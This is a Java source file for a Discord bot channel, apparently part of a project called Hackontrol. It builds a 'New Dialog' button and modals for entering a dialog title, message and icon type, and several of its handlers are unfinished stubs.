package com.khopan.hackontrol.channel;

import com.khopan.hackontrol.HackontrolChannel;
import com.khopan.hackontrol.manager.interaction.ButtonContext;
import com.khopan.hackontrol.manager.interaction.ButtonManager;
import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
import com.khopan.hackontrol.manager.interaction.InteractionManager;
import com.khopan.hackontrol.manager.interaction.ModalContext;
import com.khopan.hackontrol.manager.interaction.ModalManager;
import com.khopan.hackontrol.registry.Registry;

import net.dv8tion.jda.api.interactions.callbacks.IModalCallback;
import net.dv8tion.jda.api.interactions.components.ActionRow;
import net.dv8tion.jda.api.interactions.components.buttons.Button;
import net.dv8tion.jda.api.interactions.components.selections.StringSelectMenu;
import net.dv8tion.jda.api.interactions.components.text.TextInput;
import net.dv8tion.jda.api.interactions.components.text.TextInputStyle;
import net.dv8tion.jda.api.interactions.modals.Modal;

public class DialogChannel extends HackontrolChannel {
	private static final String CHANNEL_NAME = "dialog";

	private static Button BUTTON_NEW_DIALOG = ButtonManager.staticButton(ButtonType.SUCCESS, "New Dialog", "newDialog");

	private static String MODAL_NEW_DIALOG  = "modalNewDialog";
	private static String MODAL_EDIT_DIALOG = "modalEditDialog";

	@Override
	public String getName() {
		return DialogChannel.CHANNEL_NAME;
	}

	@Override
	public void preInitialize(Registry registry) {
		registry.register(InteractionManager.BUTTON_REGISTRY, DialogChannel.BUTTON_NEW_DIALOG, this :: buttonNewDialog);
		registry.register(InteractionManager.MODAL_REGISTRY,  DialogChannel.MODAL_NEW_DIALOG,  this :: modalNewDialog);
		registry.register(InteractionManager.MODAL_REGISTRY,  DialogChannel.MODAL_EDIT_DIALOG, this :: modalEditDialog);
	}

	@Override
	public void initialize() {
		this.channel.sendMessageComponents(ActionRow.of(DialogChannel.BUTTON_NEW_DIALOG)).queue();
	}

	private void buttonNewDialog(ButtonContext context) {
		this.newEditDialogModal(context, false, null, null);
	}

	private void modalNewDialog(ModalContext context) {
		StringSelectMenu menu = StringSelectMenu.create("testSelect")
				.addOption("Icon Information", "iconInformation")
				.addOption("Icon Question", "iconQuestion")
				.addOption("Icon Warning", "iconWarning")
				.addOption("Icon Error", "iconError")
				.setDefaultValues("iconWarning")
				.build();

		context.replyComponents(ActionRow.of(menu)).queue();
	}

	private void modalEditDialog(ModalContext context) {
		context.deferEdit().queue();
	}

	private void newEditDialogModal(IModalCallback callback, boolean edit, String title, String messageContent) {
		TextInput titleInput = TextInput.create("title", "Title", TextInputStyle.SHORT)
				.setMinLength(-1)
				.setMaxLength(-1)
				.setRequired(false)
				.setPlaceholder("Error")
				.setValue(title)
				.build();

		TextInput messageInput = TextInput.create("messageContent", "Message", TextInputStyle.PARAGRAPH)
				.setMinLength(-1)
				.setMaxLength(-1)
				.setRequired(false)
				.setPlaceholder("Type a message...")
				.setValue(messageContent)
				.build();

		Modal modal = ModalManager.staticModal(edit ? "Edit Dialog" : "New Dialog", edit ? DialogChannel.MODAL_EDIT_DIALOG : DialogChannel.MODAL_NEW_DIALOG)
				.addActionRow(titleInput)
				.addActionRow(messageInput)
				.build();

		callback.replyModal(modal).queue();
	}
}
